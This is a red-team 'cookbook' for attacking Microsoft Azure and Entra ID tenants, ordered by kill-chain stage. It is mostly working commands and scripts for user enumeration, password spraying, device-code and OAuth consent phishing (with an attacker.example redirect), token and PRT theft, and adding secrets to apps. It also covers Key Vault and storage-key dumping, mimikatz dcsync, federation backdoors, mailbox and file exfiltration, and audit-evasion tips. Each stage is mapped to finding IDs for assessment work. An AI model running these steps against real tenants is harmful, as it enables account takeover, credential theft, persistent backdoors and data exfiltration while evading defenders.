# Azure Cookbook

Kill-chain ordered. Recon → Initial Access → Enumeration → Privilege Escalation → Lateral Movement → Persistence → Data Exfiltration.

Conventions: `$TENANT_ID` for the target tenant GUID, `$SUB_ID` for subscription ID, `$UPN` for a user principal name. Assume PowerShell 7 or `az` CLI installed. Most enumeration uses Microsoft Graph (`graph.microsoft.com`) or ARM (`management.azure.com`).

---

## 1. Recon (unauthenticated)

### Tenant discovery from a domain

The tenant ID is public. So is the tenant name. So is whether a domain is federated. None of this needs creds.

```bash
# Get tenant ID and OpenID config from a domain
curl -s "https://login.microsoftonline.com/$TARGET_DOMAIN/.well-known/openid-configuration" | jq

# Same, machine-friendly
curl -s "https://login.microsoftonline.com/$TARGET_DOMAIN/v2.0/.well-known/openid-configuration" | jq .issuer

# Get tenant brand / verified domains
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=test@$TARGET_DOMAIN&xml=1"
# Returns: Managed | Federated | Unknown
# Federated = ADFS or other IdP; the AuthURL field tells you where
```

```powershell
# AADInternals (PowerShell)
Get-AADIntTenantDomains -Domain target.com
Get-AADIntLoginInformation -UserName test@target.com
Get-AADIntOpenIDConfiguration -Domain target.com
```

### Enumerate verified domains, branding, SSO

```powershell
# Get all verified domains in a tenant
Invoke-AADIntReconAsOutsider -DomainName target.com
# Returns: tenant ID, all verified domains, SSO type per domain, MX records,
# SPF, DMARC, federation provider, name of the tenant.
```

This single command often gives you: every acquisition the target has done (verified domains include subsidiaries), which domain to phish (managed = AAD password; federated = ADFS phish), and the company branding.

### User enumeration

```bash
# OneDrive enumeration — confirms whether a UPN exists
# NOTE: rate-limited and logged on tenant side. Use sparingly.
for u in user1 user2 user3; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://$TENANT.sharepoint.com/personal/${u}_$TENANT_onmicrosoft_com/_layouts/15/onedrive.aspx")
  echo "$u : $status"
done
# 403 = user exists, 404 = does not
```

```powershell
# Bulk user check via OneDrive
Invoke-UserEnumerationAsOutsider -UserName users.txt -Method OneDrive
# Or via Teams (login.microsoftonline.com endpoint)
Invoke-UserEnumerationAsOutsider -UserName users.txt -Method Normal
```

Logging note: Microsoft has been tightening this. `getuserrealm.srf` is unauthenticated and currently not logged in Entra sign-in logs. OneDrive enumeration shows up as failed accesses if the tenant ships SharePoint logs to a SIEM. Default tenants do not.

### Public application discovery

```bash
# Find externally exposed Azure apps via DNS
subfinder -d target.com -all | dnsx -cname -resp -silent | \
  grep -E 'azurewebsites.net|azurefd.net|cloudapp.azure.com|blob.core.windows.net|trafficmanager.net|azure-api.net'

# Storage account brute-force (low-cost recon, no auth)
# Storage account names are globally unique
for name in target target-prod target-backup target-data targetdata targetbackup; do
  curl -s -o /dev/null -w "%{http_code} %{url}\n" "https://${name}.blob.core.windows.net/?comp=list"
done
# 200 = container listing public, 400 = account exists but no public list,
# Could not resolve = account does not exist
```

```powershell
# MicroBurst storage enum
Invoke-EnumerateAzureBlobs -Base targetname -BingAPIKey $key -OutputFile blobs.txt
Invoke-EnumerateAzureSubDomains -Base target -Verbose
```

**Maps to:** F-AZ-STO-001 (publicly listable Blob containers), F-AZ-RECON-001 (tenant metadata disclosure — informational).

---

## 2. Initial access

### Password spraying

Spraying is loud and triggers smart lockout. Do it carefully:

```powershell
# MSOLSpray — sprays via AAD Graph endpoint, parses MFA / locked / disabled responses
Invoke-MSOLSpray -UserList users.txt -Password 'Winter2025!' -Verbose
```

```bash
# go365 — newer, supports REST + reduced lockout
go365 -url login.microsoftonline.com -e users.txt -p 'Winter2025!' -t $TENANT_ID
```

What the response codes tell you:
- `AADSTS50053`: account locked (smart lockout — back off this user).
- `AADSTS50055`: password expired (valid password, MFA bypass candidate).
- `AADSTS50057`: account disabled (still valid creds, dormant).
- `AADSTS50076`: needs MFA (valid creds! pivot to MFA fatigue / device code).
- `AADSTS50126`: invalid password (try again or move on).
- `AADSTS500011`: principal not found (user does not exist or is guest).
- `AADSTS700016`: app not found in directory.

`50076` is the gold response. Valid creds + MFA gate = phish the user for the MFA, or check whether MFA can be bypassed for some protocols.

### MFA-bypass identification

```powershell
# MFASweep — tries multiple endpoints (SMTP, IMAP, ActiveSync, Graph, etc.)
# to find one that authenticates without MFA
Invoke-MFASweep -Username test@target.com -Password 'KnownPassword' -Recon
# If ActiveSync, IMAP, or POP succeeds without MFA, that's your way in
```

Legacy protocol bypass is going extinct (Microsoft has been blocking Basic Auth in Exchange Online since 2022), but expect to find at least one tenant a year that still has it enabled per-user. Conditional Access policies often miss POP/IMAP endpoints.

### Device code phishing

Still works. The user gets a real microsoft.com URL, enters a real code, and the attacker walks away with a refresh token. CA can block this with sign-in risk policies and explicit device-code blocks, but very few tenants do.

```powershell
# TokenTactics / TokenTacticsV2
Invoke-DeviceCodeAttack
# Returns a code; phishing email points user to microsoft.com/devicelogin
# User enters the code; you get an access token + refresh token

# Useful FOCI client IDs to request tokens for:
# Microsoft Teams: 1fec8e78-bce4-4aaf-ab1b-5451cc387264
# Office UWP PWA: d3590ed6-52b3-4102-aeff-aad2292ab01c
# OneDrive iOS:   af124e86-4e96-495a-b70a-90f90ab96707
```

Once you have a refresh token from any FOCI ([Family of Client IDs](https://github.com/secureworks/family-of-client-ids-research)) client, you can swap it for tokens to other FOCI clients **without re-auth**. That's how you get from a Teams token to an Exchange token.

```powershell
# Refresh into a different audience
Get-AzureToken -Client MSGraph -RefreshToken $refresh
Get-AzureToken -Client Outlook -RefreshToken $refresh
Get-AzureToken -Client AzureCoreManagement -RefreshToken $refresh
```

### Token theft from compromised endpoint

If you have code execution on a user's machine:

```powershell
# Pull tokens from the Microsoft Identity Broker cache (Windows)
# WAM tokens are stored encrypted with DPAPI keyed to the user
# Tools: ROADtoken, RequestAADRefreshToken (PRT cookie extraction)

# Extract Primary Refresh Token (PRT)
# Requires admin or running as user with a token broker session
$cookie = Get-ROADToken
# Use the PRT cookie to request tokens for any FOCI client
```

PRT cookies are highly portable and the easiest way to bypass device-bound CA. CAE (Continuous Access Evaluation) revokes them faster now but the window is usable.

### OAuth consent phishing (illicit consent grant)

Send a user a link to consent to a malicious app that requests Mail.Read, Files.Read.All, etc. If the tenant allows users to consent to apps with non-admin permissions (default unless explicitly disabled), they will be prompted with a normal Microsoft consent screen. After consent, you get a refresh token for their account.

```bash
# Construct the consent URL
echo "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
client_id=$ATTACKER_APP_ID&
response_type=code&
redirect_uri=https://attacker.example/callback&
response_mode=query&
scope=offline_access%20Mail.Read%20Files.Read.All%20User.Read&
state=12345"
```

**Maps to:** F-AZ-IAM-010 (legacy auth not blocked), F-AZ-IAM-011 (device code phishing not blocked by CA), F-AZ-IAM-012 (user consent to apps not restricted to verified publishers).

---

## 3. Enumeration (authenticated)

### ROADtools — first thing you run

ROADrecon pulls the entire Entra ID directory via the internal AAD Graph API. It's the most complete enumeration tool for Entra and the data is queryable via the local web UI.

```bash
# Auth (refresh token, device code, username/password, or selenium)
roadrecon auth -u $UPN -p $PASSWORD
# Or with a refresh token
roadrecon auth -r $REFRESH_TOKEN

# Pull everything
roadrecon gather

# Start the web UI on localhost
roadrecon gui

# Or query the DB directly
sqlite3 roadrecon.db "SELECT displayName, accountEnabled FROM Users WHERE accountEnabled=1;"
```

What you get: every user, group, role assignment, app registration, service principal, OAuth permission grant, conditional access policy, device, eligible PIM role, directory setting. All offline. All queryable.

### AzureHound — for BloodHound

```bash
# Collect everything you have read access to
azurehound -u $UPN -p $PASSWORD --tenant $TENANT_ID list -o azurehound.json

# Or with refresh token
azurehound -r $REFRESH_TOKEN --tenant $TENANT_ID list -o azurehound.json

# Import into BloodHound CE
# Drag-and-drop the JSON into the BloodHound UI
```

Cypher queries that earn their keep:

```cypher
// Users with paths to Global Admin
MATCH p = shortestPath((u:AZUser)-[*1..]->(r:AZRole {name:'Global Administrator'}))
RETURN p

// Service principals with high-privilege Graph permissions
MATCH (sp:AZServicePrincipal)-[:AZMGGrantAppRoles]->(t:AZTenant)
RETURN sp.name, sp.appid

// Users who are Owners of any subscription
MATCH (u:AZUser)-[:AZOwns]->(s:AZSubscription)
RETURN u.name, s.name

// Eligible PIM roles (the ones that aren't always-on but can be activated)
MATCH (u:AZUser)-[r]->(role:AZRole) WHERE r.endpoint = 'EligibleAssignment'
RETURN u.name, role.name
```

### Manual ARM enumeration with az CLI

```bash
az login --tenant $TENANT_ID

# What can I see?
az account list -o table
az account show

# All subscriptions I have any access to
az account list --query "[].{Name:name, Id:id, State:state}" -o table

# What roles do I have everywhere
for sub in $(az account list --query "[].id" -o tsv); do
  az account set --subscription $sub
  echo "=== $sub ==="
  az role assignment list --assignee $UPN --all -o table
done

# Resource inventory across all subscriptions
az resource list --query "[].{Name:name, Type:type, RG:resourceGroup, Loc:location}" -o table

# All role definitions (incl. custom)
az role definition list --custom-role-only true -o json | jq '.[] | {name:.roleName, perms:.permissions}'

# Get all RBAC assignments in a subscription
az role assignment list --all --subscription $SUB_ID -o json > rbac.json

# Identify principals with Owner / Contributor / User Access Administrator
az role assignment list --all --subscription $SUB_ID --query "[?roleDefinitionName=='Owner' || roleDefinitionName=='Contributor' || roleDefinitionName=='User Access Administrator']" -o table
```

### M365 / Graph enumeration

```bash
# GraphRunner — interactive M365 post-ex
git clone https://github.com/dafthack/GraphRunner
cd GraphRunner
pwsh
Import-Module .\GraphRunner.ps1

# Get a token via device code
Get-GraphTokens

# Inventory everything
Invoke-GraphRecon -Tokens $tokens -PermissionEnum

# Search mailboxes
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password"
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "VPN" -MessageCount 200

# Search SharePoint + OneDrive
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "password"

# Dump Teams chat messages
Invoke-DumpTeamsChats -Tokens $tokens

# Find shared groups / Teams that the user is part of
Invoke-GraphRecon -Tokens $tokens -Permissions $true
```

GraphRunner specifically is what defenders should be hunting for in audit logs (`MailItemsAccessed`, `Search` activity at unusual rates).

### Conditional Access analysis

```powershell
# Pull all CA policies (needs at least Security Reader or Global Reader)
Connect-MgGraph -Scopes "Policy.Read.All"
Get-MgIdentityConditionalAccessPolicy | Select displayName, state, conditions, grantControls

# Maester — automated CA + tenant baseline checks
Install-Module Maester
Connect-Maester
Invoke-Maester -OutputFolder ./maester-report
```

Common CA misconfigurations to look for:
- Policies in `enabledForReportingButNotEnforced` state (not actually blocking).
- No CA policy requiring MFA for the `Microsoft Azure Management` app (CAE on Az portal).
- No CA policy blocking legacy authentication.
- Service accounts excluded from MFA without device / IP scoping.
- Break-glass accounts not properly scoped (excluded from everything, no monitoring).

**Maps to:** F-AZ-IAM-001 (excessive role assignments), F-AZ-IAM-002 (CA gaps), F-AZ-IAM-003 (custom roles with risky permissions), F-AZ-RBAC-001 (Owners on subscriptions for non-admins).

---

## 4. Privilege escalation

### App registration / service principal abuse

If you can edit an app registration that has high Graph permissions, you own those permissions. Critical question: who can edit the app?

```bash
# List service principals with dangerous Graph permissions
roadrecon plugin policies  # checks for high-privilege apps

# Or manual with Graph
az ad sp list --all --query "[?contains(servicePrincipalNames, 'Microsoft Graph')].{name:displayName, id:id, appId:appId}" -o table

# Check app permissions
az ad app permission list --id $APP_ID
az ad app permission list-grants --id $APP_ID --show-resource-name
```

The dangerous app role permissions to flag (any of these, granted to a principal you control, = tenant compromise):

| Permission | Effect |
|------------|--------|
| `RoleManagement.ReadWrite.Directory` | Assign yourself Global Admin |
| `AppRoleAssignment.ReadWrite.All` | Grant any app any permission |
| `Application.ReadWrite.All` | Modify any app, including its credentials |
| `Directory.ReadWrite.All` | Modify directory objects + add app credentials |
| `User.ReadWrite.All` + privilege check | Modify other users (less direct) |
| `Group.ReadWrite.All` | Add yourself to groups with role assignments |
| `RoleManagementPolicy.ReadWrite.Directory` | Modify PIM policies |

```powershell
# If you can write to a high-priv app — add your own credential
# This is the most common Entra privesc
$body = @{
  passwordCredential = @{
    displayName = "backup"
    endDateTime = (Get-Date).AddYears(2).ToString("o")
  }
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications/$APP_OBJECT_ID/addPassword" `
  -Method POST -Headers @{Authorization="Bearer $token"} -ContentType "application/json" -Body $body

# Now auth as the app
az login --service-principal -u $APP_ID -p $NEW_SECRET --tenant $TENANT_ID
# You now have whatever Graph / ARM permissions that app has
```

### Owner of an app/SP

`AppOwner` is not a role you find by searching for Global Admin in BloodHound, but it's just as good if the app has the right permissions.

```cypher
// In BloodHound:
MATCH p = (u:AZUser)-[:AZOwns]->(sp:AZServicePrincipal)-[:AZMGGrantAppRoles]->()
RETURN p
```

### Conditional Access bypass (Mollema / Bader research)

Refresh tokens issued before a CA policy was created **may continue to work** for the duration of the refresh token lifetime, depending on CAE state. CAE catches some events fast (account disable, password reset) but not policy changes by default.

The recent Mollema-discovered Actor Token bug (CVE-2025-55241) demonstrated that until patched, Azure AD Graph could be used to impersonate users cross-tenant via misvalidated Actor Tokens. Patched; included here so you check for residual exposure on legacy on-prem-syncing tenants.

For current research, follow:
- [dirkjanm.io](https://dirkjanm.io/) — Dirk-jan Mollema (ROADtools, repeated tenant compromise primitives)
- [cloudbrothers.info](https://cloudbrothers.info/) — Fabian Bader (TokenTacticsV2, CA bypass research)

### Subscription privesc — Contributor to Owner

`Contributor` cannot grant RBAC. But `Contributor` can:
- Create resources, including a User-Assigned Managed Identity, then assign it to a VM the contributor controls.
- Run scripts as managed identities that the contributor cannot directly auth as.
- Create deployment scripts that execute with the contributor's permissions.

But the simpler escalation: find a UAMI (user-assigned managed identity) with higher permissions than your account, attach it to a VM you control, exec on the VM, use the IMDS to grab a token:

```bash
# On a VM you've gained code exec on (or as Contributor: just attach a UAMI to a VM)
curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' \
  -H Metadata:true | jq

# If multiple identities are attached, specify client_id
curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F&client_id=$UAMI_CLIENT_ID' \
  -H Metadata:true | jq
```

### Key Vault privesc

Key Vault has two access models: legacy access policies + RBAC. Many tenants run both.

```bash
# List Key Vaults
az keyvault list -o table

# For each Vault, list access policies
az keyvault show --name $VAULT --query "properties.accessPolicies"

# Check for `purge` or `recover` privileges (you can delete and recreate keys, hide audit)
# Check for `Get`/`List` on secrets you shouldn't see

# Pull secrets if you have Get/List
az keyvault secret list --vault-name $VAULT -o table
for s in $(az keyvault secret list --vault-name $VAULT --query "[].name" -o tsv); do
  echo "=== $s ==="
  az keyvault secret show --vault-name $VAULT --name $s --query value -o tsv
done

# Backup all keys (often less monitored than secret reads)
mkdir backups && cd backups
for k in $(az keyvault key list --vault-name $VAULT --query "[].name" -o tsv); do
  az keyvault key backup --vault-name $VAULT --name $k --file "$k.bak"
done
```

Key Vault `Reader` (RBAC) does NOT grant secret read. `Key Vault Secrets User` does. Common audit finding: someone with `Contributor` on a subscription has no Key Vault data-plane access, but they can grant themselves access via management plane. Toggle `enableRbacAuthorization` and check.

### Storage account abuse

Storage account keys = full data plane access. Anyone with `Storage Account Contributor` or higher can rotate and retrieve them.

```bash
# Pull storage account keys
az storage account keys list --account-name $SA --resource-group $RG

# Or SAS tokens
az storage account generate-sas --account-name $SA \
  --services bfqt --resource-types sco --permissions racwdlup \
  --expiry "2026-12-31T23:59:59Z" \
  --account-key $KEY

# Now access from anywhere
az storage blob list --account-name $SA --container-name $CONTAINER --sas-token $SAS
```

**Maps to:** F-AZ-IAM-012 (service principals / app registrations with excessive Graph permissions), F-AZ-KV-001 (Key Vault access policies overly permissive), F-AZ-STO-010 (storage account key access not restricted), F-AZ-MI-001 (UAMI scope wider than needed).

---

## 5. Lateral movement

### Hybrid identity (AADConnect / Entra Connect Sync)

If the target has on-prem AD synced to Entra, the AADConnect server is a kill switch. The on-prem service account `MSOL_*` has Directory Synchronization Account role in Entra. The local `ADSync` SQL database holds the credential, encrypted with DPAPI keyed to the AADConnect server.

```powershell
# On the AADConnect / Entra Connect Sync server (admin needed)
Get-ADSyncDatabaseConfiguration  # confirm the SQL conn
# AADInternals — extracts the keys + sync account credential
$creds = Get-AADIntSyncCredentials
# $creds.AADUser and $creds.AADUserPassword = Entra ID sync service account
# Login as that account in Entra — bypasses CA in many tenants (excluded)
```

The on-prem-to-cloud direction: if you compromise on-prem AD and they use Password Hash Sync, you can dump Entra-synced password hashes from the on-prem DC (NTDS.dit). If they use Pass-Through Auth (PTA), you can inject a backdoor agent.

The cloud-to-on-prem direction: if you compromise Entra and they use Seamless SSO, you can extract the `AZUREADSSOACC$` computer account's NT hash from on-prem AD (it's used as a Kerberos secret). With it you can mint silver tickets for cloud users that authenticate against on-prem services.

```powershell
# Extract AZUREADSSOACC$ hash on a DC
mimikatz "lsadump::dcsync /user:AZUREADSSOACC$" exit
# Forge a Kerberos ticket as any Entra user → for on-prem services
```

### Subscription-to-subscription

`Management Group` permissions inherit. If a user is `Contributor` on a Management Group, they're `Contributor` on every subscription in it.

```bash
# Enumerate management groups
az account management-group list -o table
az account management-group entities list -o table

# Check inherited role assignments
az role assignment list --scope "/providers/Microsoft.Management/managementGroups/$MG_ID" -o table
```

### Cross-tenant pivots via B2B Guest

Guests in Entra can be invited cross-tenant. If a target tenant has guests from your tenant (or a tenant you control), and those guests have meaningful permissions, that's a cross-tenant lateral path.

```powershell
# Find guests in the target tenant
Get-MgUser -Filter "userType eq 'Guest'" -All

# Find guests with role assignments
Get-MgDirectoryRole | ForEach-Object {
  $role = $_
  Get-MgDirectoryRoleMember -DirectoryRoleId $_.Id | Where-Object { $_.AdditionalProperties.userType -eq 'Guest' } | ForEach-Object {
    [pscustomobject]@{Role=$role.DisplayName; Guest=$_.AdditionalProperties.userPrincipalName}
  }
}
```

### Through Logic Apps / Function Apps

Logic Apps and Function Apps often run as managed identities. They sometimes contain code that hardcodes secrets, contains connections to Key Vault, or has the Function App's master key in app settings. Anyone with read on the Function App (incl. `Reader`) can grab the master key in some cases via the Kudu console.

```bash
# Get app settings (which often contain secrets)
az functionapp config appsettings list --name $FA --resource-group $RG

# Get Kudu deployment credentials
az functionapp deployment list-publishing-credentials --name $FA --resource-group $RG

# Master key (full function exec)
az functionapp keys list --name $FA --resource-group $RG
```

### AKS lateral

```bash
# Get cluster admin via Azure RBAC (if you have Azure Kubernetes Service Cluster Admin Role)
az aks get-credentials --resource-group $RG --name $CLUSTER --admin

# Or with Azure AD integration
az aks get-credentials --resource-group $RG --name $CLUSTER
kubelogin convert-kubeconfig -l azurecli

# Verify
kubectl auth can-i --list

# Stratus Red Team — multi-cloud attack emulation (incl. AKS)
stratus list --platform azure
stratus warmup azure.lateral-movement.create-cluster-admin-rolebinding
```

**Maps to:** F-AZ-HYB-001 (Entra Connect not hardened — Tier 0 not isolated), F-AZ-HYB-002 (Seamless SSO computer object exposed), F-AZ-RBAC-006 (broad Management Group role assignment).

---

## 6. Persistence

### Adding a credential to a service principal / app

The classic. App secret + cert add via Graph survives password resets.

```powershell
# Add a new secret to a service principal
$secret = @{
  passwordCredential = @{
    displayName = "Legitimate-looking name"
    endDateTime = (Get-Date).AddYears(2).ToString("o")
  }
}
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications/$APP_OBJECT_ID/addPassword" `
  -Method POST -Body ($secret|ConvertTo-Json) -Headers @{Authorization="Bearer $token"} `
  -ContentType "application/json"

# Add a federated identity credential (FIC)
# Allows token auth from an external IdP — no secret to rotate, harder to detect
$fic = @{
  name = "github-deploy"
  issuer = "https://token.actions.githubusercontent.com"
  subject = "repo:attacker/evilrepo:ref:refs/heads/main"
  audiences = @("api://AzureADTokenExchange")
}
New-MgApplicationFederatedIdentityCredential -ApplicationId $APP_OBJECT_ID -BodyParameter $fic
```

### Adding a backdoor role assignment

```bash
# Add yourself as Owner on a subscription via a service principal you control
az role assignment create --assignee $SP_OBJECT_ID --role "Owner" --scope "/subscriptions/$SUB_ID"

# Or hide in PIM as Eligible (not active) — sometimes missed by reviews
az rest --method POST \
  --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleRequests" \
  --body @body.json
```

### Federated domain backdoor

Adding a federated domain (or modifying federation settings) lets you authenticate as any user in that domain. AADInternals demonstrated this years ago and Microsoft has hardened logging, but the technique is still alive when you have Global Admin briefly.

```powershell
# Backdoor via federation (requires Global Admin)
ConvertTo-AADIntBackdoor -DomainName attacker-controlled.com
# Now you can sign in as any user in that domain by issuing a SAML token signed with your own cert
Open-AADIntOffice365Portal -ImmutableID $immutableID -UseBuiltInCertificate -Tenant $TENANT_ID
```

### Application proxy / on-prem persistence

If the target has Entra Application Proxy connectors on-prem, those connectors hold tokens. Compromise the connector host to maintain access to internal apps.

**Maps to:** F-AZ-PERS-001 (app cred lifetime not enforced), F-AZ-PERS-002 (FIC creation not monitored), F-AZ-PERS-003 (federation changes not alerted).

---

## 7. Data exfiltration

### M365 mail / files

```powershell
# Mail dump via Graph (slow but reliable)
Invoke-DumpMailbox -Tokens $tokens -UserUPN $UPN -MessageCount 500

# OneDrive / SharePoint dump
Invoke-DumpFiles -Tokens $tokens -SearchTerm "password" -ResultsLimit 100

# Teams chat dump
Invoke-DumpTeamsChats -Tokens $tokens
```

### Storage exfil

```bash
# Sync a container locally (fast)
azcopy login --tenant-id $TENANT_ID
azcopy sync "https://$SA.blob.core.windows.net/$CONTAINER" "./local" --recursive

# Or via SAS
azcopy copy "https://$SA.blob.core.windows.net/$CONTAINER?$SAS" "./local" --recursive

# Snapshot a VM disk and copy out
az snapshot create --resource-group $RG --name evidence-snap --source $DISK_ID
az snapshot grant-access --resource-group $RG --name evidence-snap --duration-in-seconds 86400
# Returns a SAS URL — download the VHD
```

### Defender / monitoring evasion

- Avoid `mailItemsAccessed` thresholds (Microsoft caps it at ~1000 events/2 mins per user before throttling).
- Don't use Search-Mailbox or eDiscovery — those generate distinctive audit events.
- Graph API reads of mail items each generate `MailItemsAccessed` events when [Advanced Audit](https://learn.microsoft.com/microsoft-365/compliance/advanced-audit) is on (E5/A5/G5).
- Disable / detach Sentinel data connectors at your peril; absence of logs is louder than presence.

**Maps to:** F-AZ-LOG-001 (Unified Audit Log not enabled or short retention), F-AZ-LOG-002 (no Sentinel coverage), F-AZ-EXF-001 (no DLP on egress).

---

## References

- [HackingThe.Cloud — Azure section](https://hackingthe.cloud/azure/general-knowledge/)
- [Trimarc — Securing Microsoft 365 / Azure guides](https://www.hub.trimarcsecurity.com/)
- [Microsoft Threat Matrix for Azure](https://github.com/microsoft/Azure-Threat-Research-Matrix)
- [MITRE ATT&CK for Azure](https://attack.mitre.org/matrices/enterprise/cloud/azure/)
- [Dirk-jan Mollema — dirkjanm.io](https://dirkjanm.io/)
- [Fabian Bader — cloudbrothers.info](https://cloudbrothers.info/)
